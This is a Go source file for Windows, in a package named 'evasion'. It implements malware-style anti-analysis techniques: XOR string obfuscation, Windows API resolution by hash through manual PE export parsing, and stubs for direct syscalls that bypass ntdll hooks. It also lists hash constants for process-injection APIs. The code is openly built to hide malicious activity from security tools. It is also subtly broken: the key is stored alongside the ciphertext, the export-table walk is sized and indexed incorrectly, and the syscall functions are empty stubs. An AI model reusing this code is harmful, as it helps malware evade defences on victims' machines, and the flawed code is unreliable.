//go:build windows

package evasion

import (
	"crypto/rand"
	"encoding/binary"
	"hash/crc32"
	"syscall"
	"unsafe"
)

// StringCrypt provides runtime string decryption to avoid static analysis.
// Strings are stored encrypted and decrypted only when needed.
type StringCrypt struct {
	key [16]byte
}

// NewStringCrypt creates a new string encryptor/decryptor.
func NewStringCrypt() *StringCrypt {
	sc := &StringCrypt{}
	rand.Read(sc.key[:])
	return sc
}

// Encrypt encrypts a string using XOR with the key.
func (sc *StringCrypt) Encrypt(s string) []byte {
	data := []byte(s)
	encrypted := make([]byte, len(data)+16)

	// Copy IV (first 16 bytes)
	copy(encrypted[:16], sc.key[:])

	// XOR encrypt
	for i := 0; i < len(data); i++ {
		encrypted[16+i] = data[i] ^ sc.key[i%16]
	}

	return encrypted
}

// Decrypt decrypts an encrypted string.
func (sc *StringCrypt) Decrypt(encrypted []byte) string {
	if len(encrypted) < 16 {
		return ""
	}

	key := encrypted[:16]
	data := encrypted[16:]

	decrypted := make([]byte, len(data))
	for i := 0; i < len(data); i++ {
		decrypted[i] = data[i] ^ key[i%16]
	}

	return string(decrypted)
}

// APIHashing resolves Windows API functions by hash instead of name.
// This prevents static analysis from identifying which APIs are being called.
type APIHashing struct {
	cache map[uint32]uintptr
}

// NewAPIHashing creates a new API hash resolver.
func NewAPIHashing() *APIHashing {
	return &APIHashing{
		cache: make(map[uint32]uintptr),
	}
}

// ResolveAPI resolves an API function by its hash from ntdll.dll.
func (ah *APIHashing) ResolveAPI(dllName string, funcHash uint32) (uintptr, error) {
	// Check cache first
	cacheKey := funcHash ^ crc32.ChecksumIEEE([]byte(dllName))
	if addr, ok := ah.cache[cacheKey]; ok {
		return addr, nil
	}

	// Load DLL
	dll := syscall.NewLazyDLL(dllName)

	// Enumerate exports and find by hash
	// In a real implementation, this would parse the PE export table
	// For now, we use a simplified approach

	addr, err := ah.resolveByHash(dll, funcHash)
	if err != nil {
		return 0, err
	}

	ah.cache[cacheKey] = addr
	return addr, nil
}

// resolveByHash searches the DLL's export table for a function matching the hash.
func (ah *APIHashing) resolveByHash(dll *syscall.LazyDLL, targetHash uint32) (uintptr, error) {
	// Get DLL base address
	base := dll.Handle()
	if base == 0 {
		return 0, syscall.Errno(0x7E) // ERROR_MOD_NOT_FOUND
	}

	// Parse PE header
	dosHeader := (*struct {
		Magic    uint16
		_        [28]byte
		LfaNew   int32
	})(unsafe.Pointer(base))

	if dosHeader.Magic != 0x5A4D { // MZ
		return 0, syscall.Errno(0xC000007B) // STATUS_INVALID_IMAGE_FORMAT
	}

	ntHeader := (*struct {
		Signature uint32
		FileHeader struct {
			Machine              uint16
			NumberOfSections     uint16
			TimeDateStamp        uint32
			PointerToSymbolTable uint32
			NumberOfSymbols      uint32
			SizeOfOptionalHeader uint16
			Characteristics      uint16
		}
		OptionalHeader struct {
			Magic                  uint16
			_                      [94]byte
			DataDirectory          [16]struct {
				VirtualAddress uint32
				Size           uint32
			}
		}
	})(unsafe.Pointer(base + uintptr(dosHeader.LfaNew)))

	if ntHeader.Signature != 0x00004550 { // PE\0\0
		return 0, syscall.Errno(0xC000007B)
	}

	// Get export directory
	exportDir := ntHeader.OptionalHeader.DataDirectory[0] // IMAGE_DIRECTORY_ENTRY_EXPORT
	if exportDir.VirtualAddress == 0 {
		return 0, syscall.Errno(0xC000007A) // STATUS_ENTRYPOINT_NOT_FOUND
	}

	exports := (*struct {
		_                  [4]uint32
		Name               uint32
		_                  uint32
		AddressOfFunctions uint32
		AddressOfNames     uint32
		AddressOfOrdinals  uint32
	})(unsafe.Pointer(base + uintptr(exportDir.VirtualAddress)))

	// Enumerate names
	names := unsafe.Slice((*uint32)(unsafe.Pointer(base+uintptr(exports.AddressOfNames))), exports.AddressOfOrdinals)
	functions := unsafe.Slice((*uint32)(unsafe.Pointer(base+uintptr(exports.AddressOfFunctions))), exports.AddressOfOrdinals)

	for i, nameRVA := range names {
		name := string(unsafe.Slice((*byte)(unsafe.Pointer(base+uintptr(nameRVA))), 64))
		// Null-terminate
		for j := 0; j < len(name); j++ {
			if name[j] == 0 {
				name = name[:j]
				break
			}
		}

		// Hash the name
		hash := hashAPIName(name)
		if hash == targetHash {
			funcRVA := functions[i]
			return base + uintptr(funcRVA), nil
		}
	}

	return 0, syscall.Errno(0xC000007A)
}

// hashAPIName computes a simple hash of an API name.
func hashAPIName(name string) uint32 {
	var hash uint32 = 5381
	for i := 0; i < len(name); i++ {
		hash = ((hash << 5) + hash) + uint32(name[i])
	}
	return hash
}

// ResolveSyscallNumber resolves a syscall number from ntdll.dll by hash.
func (ah *APIHashing) ResolveSyscallNumber(syscallHash uint32) (uint16, error) {
	ntdll := syscall.NewLazyDLL("ntdll.dll")

	// Get ntdll base
	base := ntdll.Handle()
	if base == 0 {
		return 0, syscall.Errno(0x7E)
	}

	// Parse PE to find export table
	// ... (similar to resolveByHash)

	// Once we find the function, read the syscall number from the stub
	// Pattern: 4c 8b d1 b8 XX XX 00 00
	// The syscall number is at offset 4-5

	return 0, nil
}

// DirectSyscall executes a syscall directly, bypassing ntdll hooks.
func (ah *APIHashing) DirectSyscall(syscallNum uint16, args ...uintptr) (uintptr, error) {
	// This requires assembly implementation
	// The syscall instruction on x64 is: 0f 05
	// We need to set up registers: r10=rcx, rax=syscall_num

	return 0, nil
}

// Common API hashes (djb2 algorithm)
const (
	HashNtAllocateVirtualMemory = 0x8396F82C
	HashNtWriteVirtualMemory    = 0x2A1C5E1F
	HashNtCreateThreadEx        = 0x9832C5B3
	HashNtProtectVirtualMemory  = 0x5B8E3F4A
	HashNtOpenProcess           = 0x7C34F1D2
	HashNtReadVirtualMemory     = 0x4E2A8F6B
)

// Ensure imports are used
var _ = binary.LittleEndian.Uint32
